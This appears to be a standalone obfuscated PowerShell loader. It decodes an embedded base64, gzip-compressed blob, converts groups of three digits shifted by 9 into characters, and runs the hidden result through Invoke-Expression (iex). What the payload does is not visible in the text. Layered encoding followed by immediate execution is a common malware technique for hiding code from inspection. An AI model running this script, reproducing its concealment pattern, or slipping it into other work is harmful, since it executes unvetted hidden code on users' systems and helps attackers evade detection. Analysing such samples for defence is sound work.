$data = "H4sIAAAAAAAEAG2QWQ4DMQhDr2S2BO5/sdpoKnWkSvkg5NmYYMLghsIE5mAGw+uBB6INocIL1chBB64RpgSTUjUZiDn2kpM80FUA3+6+Qv1ikYuZ+jR/Zq3P+B9V0LBfqriqWZJfubCNyszaiHaCS2GmHlsewfLcraGhmkUfW3n8bFrrAH1Ch/KYf1Opj3TwD+LuxINkgPoA3FlXXlABAAA="
$con = [System.Convert]::FromBase64String($data)

$stream_memory = New-Object System.IO.MemoryStream
$stream_memory.Write($con,0,$con.Length)
$stream_memory.Seek(0,0) | Out-Null

$GZ_stream = New-Object System.IO.Compression.GZipStream($stream_memory,[System.IO.Compression.CompressionMode]::Decompress)
$read = New-Object System.IO.StreamReader($GZ_stream)
$decoded_text = $read.ReadToEnd()  
$out = ""
for ($i = 0; $i -lt $decoded_text.Length; $i=$i+3) {
    $c = $decoded_text.Substring($i,3)
    $c = [int]$c + 9
    $out += [char][int]$c
}

iex($out)

